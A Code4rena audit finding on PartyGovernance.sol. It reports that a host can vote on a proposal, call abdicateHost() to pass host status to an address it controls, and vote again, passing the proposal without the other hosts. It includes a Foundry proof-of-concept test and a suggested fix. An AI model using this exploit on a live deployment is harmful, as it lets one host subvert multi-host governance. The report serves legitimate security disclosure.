# Original link
https://github.com/code-423n4/2023-10-party-findings/issues/444
# Lines of code

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L457


# Vulnerability details

## Impact

A `party` can be created using a determined number of hosts. Those hosts can vote individually to a proposal in order to pass the proposal. Additionally the proposal can not be voted multiple times by the same `host`:

```solidity
File: PartyGovernance.sol
595:     function accept(uint256 proposalId, uint256 snapIndex) public returns (uint256 totalVotes) {
...
...
626:         // Cannot vote twice.
627:         if (info.hasVoted[msg.sender]) {
628:             revert AlreadyVotedError(msg.sender);
629:         }
630:         // Mark the caller as having voted.
631:         info.hasVoted[msg.sender] = true;
...
```

The problem is that the `host` can transfer his voting power using [abdicateHost()](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L457) function to a controlled address then vote again to the same proposal. The same `host` can pass a proposal without the approval of other hosts.

## Proof of Concept

I created a test where the same `host` passes the proposal (status ready) without the approval of the other host. Test steps:

1. The host `defaultGovernanceOpts.hosts[0]` accepts the proposal
2. The same host can not vote to the same proposal. Transaction will be reverted.
3. The same host transfers his voting power to `address(1337)` using the `abdicateHost` func. The new controlled `address(1337)` can vote to the same proposal.
4. The proposal now is `ready` and the malicious host does not need the approval of other legitimate hosts.

```solidity
// File: PartyGovernanceUnit.t.sol
// $ forge test --match-test "testHostCanPassAProposalWithoutTheApproveOfTheOtherHosts" -vvv
//
    function testHostCanPassAProposalWithoutTheApproveOfTheOtherHosts() external {
        (
            IERC721[] memory preciousTokens,
            uint256[] memory preciousTokenIds
        ) = _createPreciousTokens(2);
        TestablePartyGovernance gov = _createGovernance(
            false,
            100e18,
            preciousTokens,
            preciousTokenIds
        );
        address undelegatedVoter = _randomAddress();
        gov.rawAdjustVotingPower(undelegatedVoter, 51e18, address(0));
        //
        // Create a one-step proposal.
        PartyGovernance.Proposal memory proposal = _createProposal(1);
        uint256 proposalId = gov.getNextProposalId();
        //
        // Skip because `accept()` will query voting power at `proposedTime - 1`
        skip(1);
        vm.prank(undelegatedVoter);
        assertEq(gov.propose(proposal, 0), proposalId);
        _assertProposalStatusEq(gov, proposalId, PartyGovernance.ProposalStatus.Passed);
        //
        // 1. The host defaultGovernanceOpts.hosts[0] accepts the proposal
        vm.startPrank(defaultGovernanceOpts.hosts[0]);
        gov.accept(proposalId, 0);
        _assertProposalStatusEq(gov, proposalId, PartyGovernance.ProposalStatus.Passed);
        //
        // 2. The same host can not vote to the same proposal. Transaction will be reverted.
        vm.expectRevert();
        gov.accept(proposalId, 0);
        //
        // 3. The same host transfers his voting power to address(1337) using the abdicateHost func
        // The new controlled address can vote to the same proposal, now the proposal is ready
        gov.abdicateHost(address(1337));
        vm.stopPrank();
        vm.prank(address(1337));
        gov.accept(proposalId, 0);
        //
        // 4. The proposal now is `ready` and the host does not need the approval of other legitimate hosts
        _assertProposalStatusEq(gov, proposalId, PartyGovernance.ProposalStatus.Ready);
    }
```

## Tools used

Manual review

## Recommended Mitigation Steps

When transfer the voting power using the [abdicateHost](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L457), the new host should be able to vote only for new proposals.


## Assessed type

Context